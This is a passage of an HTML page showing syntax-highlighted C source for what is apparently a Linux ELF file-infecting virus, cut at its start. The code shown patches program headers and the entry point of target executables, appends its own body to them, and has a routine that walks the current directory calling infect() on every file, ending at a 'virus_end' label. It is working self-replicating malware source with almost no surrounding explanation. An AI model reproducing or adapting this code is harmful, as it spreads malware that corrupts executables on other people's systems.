    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">base</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">new_phnum</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new_phnum</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">new_phdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">new_phnum</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Phdr</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">new_phnum</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">loader</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">loader</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_entry</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">new_phnum</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">m</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">ok</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ok</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">ftruncate</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">off</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">self</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc19">size</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">off</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">old_entry</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__attribute__</span><span class="sc10">((</span><span class="sc11">used</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc11">caveat</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">dot</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc7">'.'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">h</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">self</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">__builtin_return_address</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">h</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">dot</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">readdir</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">self</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">);</span><span class="sc0">
    
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">asm</span><span class="sc10">(</span><span class="sc6">"virus_end:"</span><span class="sc10">);</span><span class="sc0">
</span></div></body>
</html>
